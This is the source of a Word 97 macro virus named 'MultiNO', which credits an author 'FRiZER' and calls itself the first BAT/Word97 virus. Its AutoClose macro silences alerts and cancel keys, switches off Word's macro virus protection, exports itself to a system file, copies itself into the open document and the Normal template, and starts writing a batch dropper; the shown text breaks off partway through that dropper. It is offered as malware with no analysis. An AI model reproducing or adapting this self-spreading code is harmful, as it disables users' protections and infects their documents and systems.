Attribute VB_Name = "MultiNO"
Sub AutoClose()
' MultiNO (Word97 part) '
' 1st BAT/Word97 virus! '
' ----- by FRiZER ----- '
On Error GoTo sys_exp
With Application
.DisplayAlerts = wdAlertsNone
.EnableCancelKey = wdCancelDisabled
.ScreenUpdating = False
End With
ShowVisualBasicEditor = False
Open "c:\logov.sys" For Input As 1
Close 1
GoTo skip_exp
sys_exp:
Application.VBE.ActiveVBProject.VBComponents("MultiNO").Export "c:\logov.sys"
skip_exp:
On Error GoTo complete
If ActiveDocument = "" Then GoTo complete
With Options
.VirusProtection = False
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
ActiveDocument.ReadOnlyRecommended = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "MultiNO" Then nt = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "MultiNO" Then ad = True
Next i
If ad = False Then
ActiveDocument.VBProject.VBComponents.Import("c:\logov.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
If nt = False Then NormalTemplate.VBProject.VBComponents.Import("c:\logov.sys")
Open "c:\dropper.scr" For Output As 1
Print #1, "N dropper.bat"
